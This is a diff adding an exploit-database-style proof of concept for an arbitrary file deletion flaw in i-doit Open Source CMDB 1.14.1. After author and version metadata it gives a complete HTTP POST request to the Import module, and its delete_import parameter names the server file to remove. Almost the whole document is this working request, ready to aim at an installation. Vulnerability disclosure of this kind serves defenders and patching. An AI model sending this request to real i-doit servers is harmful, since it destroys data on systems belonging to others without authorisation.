@@ -1,0 +1,34 @@
+# Exploit Title: i-doit Open Source CMDB 1.14.1 - Arbitrary File Deletion
+# Date: 2020-05-02
+# Author: Besim ALTINOK
+# Vendor Homepage: https://www.i-doit.org/
+# Software Link: https://sourceforge.net/projects/i-doit/
+# Version: v1.14.1
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+
+--------------------------------------------------------------------------------------------------
+
+Vulnerable Module ---> Import Module
+Vulnerable parameter ---> delete_import
+-----------
+PoC
+-----------
+
+POST /idoit/?moduleID=50&param=1&treeNode=501&mNavID=2 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 ******************************
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/idoit/?moduleID=50&param=1&treeNode=501&mNavID=2
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.7.3
+Content-type: application/x-www-form-urlencoded; charset=UTF-8
+X-i-doit-Tenant-Id: 1
+Content-Length: 30
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=bf21********************************68b8
+
+delete_import=Type the filename, you want to delete from the server here
